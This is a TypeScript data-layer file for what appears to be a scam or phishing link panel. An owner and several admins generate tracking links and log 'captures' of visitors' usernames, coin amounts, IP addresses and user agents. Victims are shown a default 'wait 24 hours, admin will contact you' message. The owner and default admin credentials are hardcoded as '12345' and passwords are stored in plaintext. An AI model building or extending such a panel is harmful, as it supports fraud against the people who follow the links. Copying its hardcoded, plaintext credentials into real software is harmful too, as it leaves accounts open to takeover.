// Data Layer - localStorage based persistence

export interface Admin {
  id: string;
  username: string;
  password: string;
  createdAt: string;
}

export interface Capture {
  id: string;
  username: string;
  coinAmount: number;
  timestamp: string;
  ipAddress: string;
  userAgent: string;
  status: string;
}

export interface Link {
  id: string;
  slug: string;
  url: string;
  adminId: string;
  adminName: string;
  createdAt: string;
  captures: Capture[];
  customMessage: string;
}

const KEYS = {
  ADMINS: 'tk_admins',
  LINKS: 'tk_links',
  OWNER_SESSION: 'tk_owner_session',
  ADMIN_SESSION: 'tk_admin_session',
};

// Owner credentials (hardcoded)
export const OWNER_CREDENTIALS = {
  username: 'owner',
  password: '12345',
};

// Initialize default admin if none exists
export function initializeData() {
  const admins = getAdmins();
  if (admins.length === 0) {
    // Create default admin "shadow"
    const defaultAdmin: Admin = {
      id: 'shadow',
      username: 'shadow',
      password: '12345',
      createdAt: new Date().toISOString(),
    };
    saveAdmins([defaultAdmin]);
  }
}

// Admin Management
export function getAdmins(): Admin[] {
  try {
    const data = localStorage.getItem(KEYS.ADMINS);
    return data ? JSON.parse(data) : [];
  } catch {
    return [];
  }
}

export function saveAdmins(admins: Admin[]) {
  localStorage.setItem(KEYS.ADMINS, JSON.stringify(admins));
}

export function addAdmin(admin: Admin): boolean {
  const admins = getAdmins();
  if (admins.find(a => a.username === admin.username)) {
    return false; // Username already exists
  }
  admins.push(admin);
  saveAdmins(admins);
  return true;
}

export function deleteAdmin(id: string) {
  const admins = getAdmins().filter(a => a.id !== id);
  saveAdmins(admins);
  // Also delete all links associated with this admin
  const links = getAllLinks().filter(l => l.adminId !== id);
  saveAllLinks(links);
}

export function validateAdmin(username: string, password: string): Admin | null {
  const admins = getAdmins();
  return admins.find(a => a.username === username && a.password === password) || null;
}

// Link Management
export function getAllLinks(): Link[] {
  try {
    const data = localStorage.getItem(KEYS.LINKS);
    return data ? JSON.parse(data) : [];
  } catch {
    return [];
  }
}

export function saveAllLinks(links: Link[]) {
  localStorage.setItem(KEYS.LINKS, JSON.stringify(links));
}

export function getAdminLinks(adminId: string): Link[] {
  return getAllLinks().filter(l => l.adminId === adminId);
}

export function getLinkBySlug(adminId: string, slug: string): Link | undefined {
  return getAllLinks().find(l => l.adminId === adminId && l.slug === slug);
}

export function generateLink(adminId: string, adminName: string): Link {
  const slug = generateSlug();
  const links = getAllLinks();
  const newLink: Link = {
    id: `link_${Date.now()}`,
    slug,
    url: `${window.location.origin}${window.location.pathname}#/s/${adminId}/${slug}`,
    adminId,
    adminName,
    createdAt: new Date().toISOString(),
    captures: [],
    customMessage: 'Please wait 24 hours. Admin will contact you soon.',
  };
  links.push(newLink);
  saveAllLinks(links);
  return newLink;
}

export function deleteLink(linkId: string) {
  const links = getAllLinks().filter(l => l.id !== linkId);
  saveAllLinks(links);
}

export function updateLinkMessage(linkId: string, message: string) {
  const links = getAllLinks();
  const link = links.find(l => l.id === linkId);
  if (link) {
    link.customMessage = message;
    saveAllLinks(links);
  }
}

export function updateCaptureStatus(linkId: string, captureId: string, status: string) {
  const links = getAllLinks();
  const link = links.find(l => l.id === linkId);
  if (link) {
    const capture = link.captures.find(c => c.id === captureId);
    if (capture) {
      capture.status = status;
      saveAllLinks(links);
    }
  }
}

// Capture Management
export function addCapture(adminId: string, slug: string, capture: Omit<Capture, 'id' | 'timestamp'>) {
  const links = getAllLinks();
  const link = links.find(l => l.adminId === adminId && l.slug === slug);
  if (link) {
    const newCapture: Capture = {
      ...capture,
      id: `cap_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`,
      timestamp: new Date().toISOString(),
      status: 'New',
    };
    link.captures.push(newCapture);
    saveAllLinks(links);
    return newCapture;
  }
  return null;
}

// Session Management
export function setOwnerSession() {
  localStorage.setItem(KEYS.OWNER_SESSION, JSON.stringify({ loggedIn: true, timestamp: Date.now() }));
}

export function isOwnerLoggedIn(): boolean {
  try {
    const session = localStorage.getItem(KEYS.OWNER_SESSION);
    if (session) {
      const parsed = JSON.parse(session);
      return parsed.loggedIn === true;
    }
  } catch { /* empty */ }
  return false;
}

export function clearOwnerSession() {
  localStorage.removeItem(KEYS.OWNER_SESSION);
}

export function setAdminSession(adminId: string, adminName: string) {
  localStorage.setItem(KEYS.ADMIN_SESSION, JSON.stringify({ adminId, adminName, timestamp: Date.now() }));
}

export function getAdminSession(): { adminId: string; adminName: string } | null {
  try {
    const session = localStorage.getItem(KEYS.ADMIN_SESSION);
    if (session) {
      const parsed = JSON.parse(session);
      // Check if admin still exists
      const admin = getAdmins().find(a => a.id === parsed.adminId);
      if (admin) return parsed;
    }
  } catch { /* empty */ }
  return null;
}

export function clearAdminSession() {
  localStorage.removeItem(KEYS.ADMIN_SESSION);
}

// Statistics
export function getOwnerStats() {
  const admins = getAdmins();
  const links = getAllLinks();
  const totalCaptures = links.reduce((sum, l) => sum + l.captures.length, 0);
  return {
    totalAdmins: admins.length,
    totalLinks: links.length,
    totalCaptures,
    adminDetails: admins.map(admin => {
      const adminLinks = links.filter(l => l.adminId === admin.id);
      const adminCaptures = adminLinks.reduce((sum, l) => sum + l.captures.length, 0);
      return {
        ...admin,
        linkCount: adminLinks.length,
        captureCount: adminCaptures,
      };
    }),
  };
}

export function getAdminStats(adminId: string) {
  const links = getAdminLinks(adminId);
  const totalCaptures = links.reduce((sum, l) => sum + l.captures.length, 0);
  return {
    totalLinks: links.length,
    totalCaptures,
    links,
  };
}

// Helper
function generateSlug(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  // Ensure unique
  const links = getAllLinks();
  if (links.find(l => l.slug === result)) {
    return generateSlug();
  }
  return result;
}

// IP Address helper (mock - in real app would use a service)
export function getClientInfo() {
  return {
    ip: '127.0.0.1',
    userAgent: navigator.userAgent,
  };
}

// Subscribe to storage changes (for cross-tab sync)
export function subscribeToStorageChanges(callback: () => void) {
  const handler = () => callback();
  window.addEventListener('storage', handler);
  return () => window.removeEventListener('storage', handler);
}
